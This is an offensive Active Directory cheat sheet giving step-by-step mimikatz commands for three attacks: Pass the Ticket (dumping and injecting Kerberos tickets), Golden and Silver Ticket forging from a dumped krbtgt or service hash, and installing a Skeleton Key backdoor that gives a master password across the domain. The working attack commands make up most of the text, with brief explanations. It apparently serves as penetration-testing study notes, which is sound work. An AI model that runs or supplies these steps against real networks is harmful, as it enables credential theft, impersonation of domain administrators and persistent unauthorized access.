inside of an active directory network

##################### Pass the Ticket Attack #####################
Dump Tickets:
  mimikatz.exe   Run mimikatz (run the command prompt as an administrator)
  privilege::debug
                 Ensure this outputs [output '20' OK] if it does not that means you do not
                 have the administrator privileges to properly run mimikatz
  sekurlsa::tickets /export
                 Export all of the .kirbi tickets into the directory that you are currently in

Pass the Ticket:
  kerberos::ptt <TICKET>
                 Cache and impersonate the given ticket
  klist          Verify successfully impersonated ticket by listing cached tickets
                 You now have impersonated the ticket giving you the same rights 
                 as the TGT you're impersonating

Informational:
  Pass the Ticket attack is used for privilege escalation and lateral movement
  if there are unsecured domain service account tickets laying around.
  The attack allows you to escalate to domain admin if you dump a domain admin's
  ticket and then impersonate that ticket using mimikatz PTT attack allowing you 
  to act as that domain admin.

##################### Golden/Silver Ticket Attack #####################
Dump the krbtgt hash:
  cd downloads && mimikatz.exe 
                 Navigate to the directory mimikatz is in and run mimikatz
  privilege::debug
                 Ensure this outputs [privilege '20' ok]
  lsadump::lsa /inject /name:krbtgt
                 Dump the hash as well as the security identifier needed to create
                 a Golden Ticket. To create a silver ticket you need to change the
                 /name: to dump the hash of either a domain admin account or a
                 service account such as the SQLService account.

Create a Golden/Silver Ticket:
  Kerberos::golden /user:Administrator /domain:<DOMAIN>.local /sid:<SID> /krbtgt:<NTLM_HASH> /id:500
                 Create a golden ticket to create a silver ticket simply put a service
                 NTLM hash into the krbtgt slot, the sid of the service account into
                 sid, and change the id to 1103.

Use the Golden/Silver Ticket to access other machines:
  misc::cmd      Open a new elevated command prompt with the given ticket in mimikatz
  dir \\DESKTOP-1\c$
                 Access machines that you want

Informational:
  A golden ticket attack works by dumping the ticket-granting ticket of any user on
  the domain this would preferably be a domain admin however for a golden ticket
  you would dump the krbtgt ticket and for a silver ticket, you would dump any
  service or domain admin ticket. You then use these details inside of a mimikatz 
  golden ticket attack in order to create a TGT that impersonates the given service
  account information
  What you can access after creating a ticket will depend on the privileges
  of the user that you decided to take the ticket from however if you took the ticket
  from krbtgt you have access to the ENTIRE network hence the name golden ticket;
  however, silver tickets only have access to those that the user has access to if
  it is a domain admin it can almost access the entire network however it is slightly 
  less elevated from a golden ticket.

##################### Skeleton Key Backdoor #####################
Preparing Mimikatz:
  cd Downloads && mimikatz.exe
                 Navigate to the directory mimikatz is in and run mimikatz
  privilege::debug
                 This should be a standard for running mimikatz as mimikatz
                 needs local administrator access

Installing the Skeleton Key w/ mimikatz:
  misc::skeleton
                 That is it

Accessing the forest:
  The default credentials will be: "mimikatz"
  net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
                  Example - The share will now be accessible without the need for the Administrators password
  dir \\Desktop-1\c$ /user:Machine1 mimikatz
                  Example - Access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

Informational:
  Kerberos backdoor is much more subtle because it acts similar to a rootkit
  by implanting itself into the memory of the domain forest allowing itself access
  to any of the machines with a master password. 
  The skeleton key will not persist by itself because it runs in the memory, 
  but it can be scripted or persisted using other tools and techniques.
